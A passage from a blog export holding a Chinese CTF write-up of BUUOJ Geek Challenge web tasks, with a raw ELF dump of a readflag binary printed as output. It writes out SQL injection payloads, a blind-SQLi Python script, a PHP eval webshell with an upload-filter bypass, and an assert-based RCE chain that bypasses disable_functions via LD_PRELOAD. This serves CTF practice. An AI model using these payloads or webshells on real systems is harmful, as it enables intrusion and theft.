\u000b\u0012)\"\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b`\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�=\f\u0001�\u0015\u000e �\u000f\u001fDH�=y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�=9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��=�\b u'H�=�\b UH��t\fH�=�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�=A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�=���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002/bin/cat /flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����`\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$\"\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007`\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e`\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002\"�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006`\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b<\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d/\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001\" \n```\n\n是linux可执文件\n\n连接蚁剑 payload :\n\n```\n?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=eval($_POST['cmd'])\n```\n\n应该是要绕过disable_function,从而执行readflag，项目地址\n\n```\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n```\n\n只有/tmp有文件修改权限，上传`bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so`到/tmp下\n\n最后payload:\n\n```\n?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=include \"/tmp/bypass_disablefunc.php\"&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/bypass_disablefunc_x64.so\n```\n\n输出为\n\n```\n example: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so\n\ncmdline: /readflag > /tmp/xx 2>&1\n\noutput:\nflag{6e16639a-9eca-45b8-a972-e61da4146393}\n```\n\n","source":"_posts/buuoj刷题记录10-极客大挑战web2.md","raw":"---\ntitle: buuoj刷题记录10-极客大挑战web2\ndate: 2020-01-24 23:37:07\ntags:\n- ctf\n- 极客大挑战\n- web\ncategories: \n - 刷题记录\n---\n\n## 极客大挑战web\n\n### LoveSQL\n\nfuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误\n\n常规操作\n\n<!--more-->\n\n1. #### order by判断字段，字段为3\n\n![](/pic/38.png)\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123 `\n\n![](/pic/39.png)\n\n2. #### union确定回显，回显位置为2，3\n\n`?username='union+select+1,2,3+%23&password=123`\n\n![](/pic/40.png)\n\n3. #### 查数据库\n\n`?username='union+select+1,database(),3+%23&password=123`\n\n![](/pic/41.png)\n\n4. #### 查表\n\n`?username='union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema='geek'+%23&password=123`\n\n![](/pic/42.png)\n\nl0ve1ysq1、geekuser\n\n5. #### 查列名\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='l0ve1ysq1'+%23&password=123`\n\n![](/pic/43.png)\n\n`?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='geekuser'+%23&password=123`\n\n![](/pic/44.png)\n\n6. #### 查数据\n\n`?username='union+select+1,group_concat(username,',',password),3+from+geekuser+limit+0,1+%23&password=123`\n\ngeekuser只有一个admin\n\n![](/pic/45.png)\n\nl0ve1ysq1表中发现了flag\n\n`?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123` \n\n![](/pic/46.png)\n\n\n\n### BabySQL\n\nfuzzing一下，将union,select,and,or,where,from删除\n\n此时可以selselectect将select删除之后就变成了sel ~~select~~ ect\n\n因为和上面的一样，直接查询数据库\n\n1. #### 查数据库\n\n`?username='uniunionon+selselectect+1,database(),3--+&password=123`\n\n数据库名还是geek\n\n2. #### 查询表\n\n```\n?username='uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema='geek'--+&password=123\n```\n\nb4bsql,geekuser\n\n3. #### 查列名\n\n`?username='uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema='geek'+anandd+table_name='b4bsql'--+&password=123`\n\n列名还是id,username,password\n\n4. #### 查询数据\n\n`?username='uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&password=123`\n\n![](/pic/47.png)\n\n成功拿到flag\n\n### Http\n\n打开BP，开启拦截，查看site map发现有一个secret.php\n\n![](/pic/48.png)\n\n访问即可\n\n根据提示修改http头\n\n```http\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:27400\nAccept-Encoding: gzip, deflate\nAccept: */*\nX-Forwarded-for:127.0.0.1\nAccept-Language: en\nReferer:https://www.Sycsecret.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0\nConnection: close\n\n```\n\n### BuyFlag\n\n点进去有一个payflag界面,\n\n根据提示，\n\n```html\nIf you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!! \n\nOnly Cuit's students can buy the FLAG\n```\n\n页面最后有一段注释\n\n```html\n<!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n-->\n```\n\n这一段注释是对输入的`password`作比较，输入的是404，且能绕过`is_numeric()`函数。\n\n在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的\n\n![](/pic/49.png)\n\n抓包发现有cookie, user=0，改成=1，变成了\n\n```\nyou are Cuiter\nPlease input your password!!\n```\n\n传入数据`password=404a&money=999999999`，他说数据太长，只能传入八位。\n\n之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过\n\n`password=404a&money[]=`\n\n### Upload\n\n上传PHP一句话被过滤\n\n![](/pic/50.png)\n\n换成图片后缀jpg进行%00截断，还是被过滤\n\n![](/pic/51.png)\n\n尝试php2,php3,php5都被过滤\n\n![](/pic/52.png)\n\n![](/pic/53.png)\n\n![](/pic/54.png)\n\n只有phtml没有被过滤\n\n![](/pic/55.png)\n\n内容不能出现`<?`可以换成js的写法\n\n![](/pic/56.png)\n\n```js\n<script language=\"php\">\neval($_POST['cmd']);\n</script>\n```\n\n再上传提示必须是图片，添加gif文件头`GIF89a`\n\n![](/pic/57.png)\n\n使用蚁剑，菜刀连接，找到flag\n\n![](/pic/58.png)\n\n### HardSQL\n\nfuzz测试\n\n`AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&&,<,>,ascii,%20,%09`被过滤\n\n输入错误还会报出sql语句错误，考虑报错注入\n\n1. #### 查数据库\n\n   `?username=admin'or(updatexml(0,concat(0,(select(database())),0))%23`还是geek\n\n2. #### 查表\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))%23`\n\n   H4rDsq1\n\n3. #### 查列名（应该还是只有id,usname,password）\n\n4. #### 查数据\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&password=123`\n\n   `?username=admin'or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&password=123`\n   \n   因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。\n\n\n\n### FinalSQL\n\nfuzz之后发现被过滤的关键字有\n\n![](/pic/59.png)\n\n题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框\n\n![](/pic/60.png)\n\n![](/pic/61.png)\n\n根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\n\ndef get(payload):\n    url = 'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('+payload+')'\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'others' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database()\n\n# get_tabls('geek') #F1naI1y,Flaaaaag\n#\n# get_columns('F1naI1y') # id,username,password\n# get_columns('Flaaaaag') # id,fl4gawsl\n\n# get_data('fl4gawsl','Flaaaaag')\nget_data('id,username,password','F1naI1y')\n```\n\n跑出来有两个表F1naI1y,Flaaaaag\n\nF1naI1y表还是只有id,username,password\n\nFlaaaaag表包括id,fl4gawsl\n\n### RCE ME\n\n打开题目有源码\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){  \n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n 传入一个code参数，长度不能大于40，不能包含大小写字母和数字\n\n可以使用取反或者异或拼凑函数\n\n```\n?code=$_=(~?>);$$_{%27__%27}($$_{%27_%27});&_=phpinfo()&__=assert\n```\n\n```\n%A0%AF%B0%AC%AB是_GET的取反的值，$$_{%27__%27}($$_{%27_%27})`就相当于 $_GET{'__'}($_GET{'_'})   联合起来就是assert(phpinfo())\n```\n\n\n\n关于assert函数**\n\nPHP 5 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, string `$description` ] ) : bool\n\nPHP 7 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] ) : bool\n\n**assert()** 会检查指定的 `assertion` 并在结果为 **`FALSE`** 时采取适当的行动。\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。 `assertion` 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 `assertion` 表达式。 这意味着如果你传入了 boolean 的条件作为 `assertion`，这个条件将不会显示为断言函数的参数；在调用你定义的 [assert_options()](https://www.php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。\n\n![](/pic/64.png)\n\n先查看phpinfo()\n\n![](/pic/62.png)\n\n禁用了很多执行系统命令的函数\n\n![](/pic/63.png)\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl\n```\n\n扫描当前目录 \n\npost 数据： `_=print_r(scandir(%27./%27))&__=assert`\n\n```\nArray (    [0] => .    [1] => ..    [2] => index.php )\n```\n\n扫描根目录\n\npost数据：`_=print_r(scandir(%27/%27))&__=assert`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => readflag [16] => root [17] => run [18] => sbin [19] => srv [20] => sys [21] => tmp [22] => usr [23] => var ) \n```\n\n发现有一个flag文件和一个readflag文件。尝试读取内容\n\n读取flag中的文件是空的；\n\npost数据：`_=var_dump(file_get_contents(%27/flag%27))&__=assert`\n\npost数据：`_=var_dump(file_get_contents(%27/readflag%27))&__=assert`\n\n```\nstring(8856) \"ELF\u0002\u0001\u0001\u0003>\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b<<\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001/lib64/ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�`[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � \u000b\u0012)\"\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b`\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�=\f\u0001�\u0015\u000e �\u000f\u001fDH�=y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�=9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��=�\b u'H�=�\b UH��t\fH�=�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�=A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�=���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002/bin/cat /flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����`\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$\"\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007`\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e`\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002\"�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006`\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b<\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d/\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001\" \n```\n\n是linux可执文件\n\n连接蚁剑 payload :\n\n```\n?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=eval($_POST['cmd'])\n```\n\n应该是要绕过disable_function,从而执行readflag，项目地址\n\n```\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n```\n\n只有/tmp有文件修改权限，上传`bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so`到/tmp下\n\n最后payload:\n\n```\n?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=include \"/tmp/bypass_disablefunc.php\"&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/bypass_disablefunc_x64.so\n```\n\n输出为\n\n```\n example: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so\n\ncmdline: /readflag > /tmp/xx 2>&1\n\noutput:\nflag{6e16639a-9eca-45b8-a972-e61da4146393}\n```\n\n","slug":"buuoj刷题记录10-极客大挑战web2","published":1,"updated":"2020-01-24T15:37:07.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfjq000apk7ebclm4fsz","content":"<h2 id=\"极客大挑战web\"><a href=\"#极客大挑战web\" class=\"headerlink\" title=\"极客大挑战web\"></a>极客大挑战web</h2><h3 id=\"LoveSQL\"><a href=\"#LoveSQL\" class=\"headerlink\" title=\"LoveSQL\"></a>LoveSQL</h3><p>fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误</p>\n<p>常规操作</p>\n<a id=\"more\"></a>\n\n<ol>\n<li><h4 id=\"order-by判断字段，字段为3\"><a href=\"#order-by判断字段，字段为3\" class=\"headerlink\" title=\"order by判断字段，字段为3\"></a>order by判断字段，字段为3</h4></li>\n</ol>\n<p><img src=\"/pic/38.png\" 